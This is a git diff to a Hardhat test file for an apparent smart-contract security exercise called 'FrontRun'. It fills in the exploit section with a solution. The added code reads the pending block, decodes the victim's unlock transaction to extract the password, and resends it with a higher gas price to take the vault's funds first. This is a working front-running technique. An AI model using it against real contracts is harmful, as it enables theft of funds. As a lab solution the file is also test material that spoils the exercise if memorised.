@@ -23,6 +23,7 @@ describe("FrontRun", function () {
     ]);
 
     // Disable automine on the hardhat network and set the block time to 1 second
+    //console.log(network);
     await network.provider.send("evm_setAutomine", [false]);
     await network.provider.send("evm_setIntervalMining", [1000]);
 
@@ -31,6 +32,7 @@ describe("FrontRun", function () {
     // Generate random password
     // DO NOT ACCESS THIS VARIABLE IN YOUR EXPLOIT
     const password = ethers.utils.randomBytes(32);
+    
     const hashedPassword = ethers.utils.keccak256(password);
 
     this.vault = await VaultFactory.deploy(hashedPassword, {
@@ -38,19 +40,38 @@ describe("FrontRun", function () {
     });
 
     await this.vault.deployed();
-
+    
     expect(await this.vault.getHashedSecret()).to.equal(hashedPassword);
     expect(await ethers.provider.getBalance(this.vault.address)).to.equal(
       VAULT_BALANCE
     );
 
     // ALICE SENDS TX TO WITHDRAW FUNDS
+    console.log(`Alice Address: ${alice.address}`)
     await this.vault.unlock(password);
   });
 
   it("EXPLOIT", async function () {
     /** WRITE YOUR EXPLOIT CODE HERE */
     /** END EXPLOIT CODE */
+    const test = await network.provider.send("eth_getBlockByNumber", ["pending", true]);
+    const txHash = test.transactions[0].hash;
+
+    const tx = await ethers.provider.getTransaction(txHash);
+    
+    const iface = new ethers.utils.Interface(['function unlock(bytes)'])
+    
+    const decodedInput = iface.parseTransaction({ data: tx.data, value: tx.value});
+    
+    let password = decodedInput.args;
+    let x = ethers.utils.arrayify(password[0]);
+    //@ts-ignore
+    let newGasPrice = tx.gasPrice?.toNumber() + 1;
+    //@ts-ignore
+    newGasPrice = ethers.utils.parseUnits(newGasPrice.toString(), 'wei');
+    await this.vault.connect(attacker).unlock(x, {gasPrice: newGasPrice});
+
+    //const tst = await network.provider.send("eth_getBlockByNumber", ["pending", true]);
   });
 
   after(async function () {
